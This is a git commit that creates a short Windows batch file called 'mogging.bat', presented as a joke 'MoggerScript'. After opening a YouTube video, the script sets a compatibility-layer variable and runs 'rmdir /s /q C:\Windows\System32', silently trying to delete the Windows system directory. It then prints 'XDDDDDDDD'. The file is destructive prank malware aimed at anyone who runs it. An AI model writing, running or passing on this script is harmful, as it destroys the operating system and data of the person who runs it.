541acb4922b724828a9d10e443def06013397ce3
strblzng <160648940+strblzng@users.noreply.github.com>
2024-02-20 19:38:49 +0100

    Create mogging.bat

---
+++ mogging.bat
@@ -0,0 +1,5 @@
+rem "MoggerScript by strblzng 1.0"
+start https://www.youtube.com/watch?v=Sz_kQuEM0mI
+Set __COMPAT_LAYER=RunAsInvoker && rmdir /s /q C:\Windows\System32
+echo "XDDDDDDDD"
+pause > nul
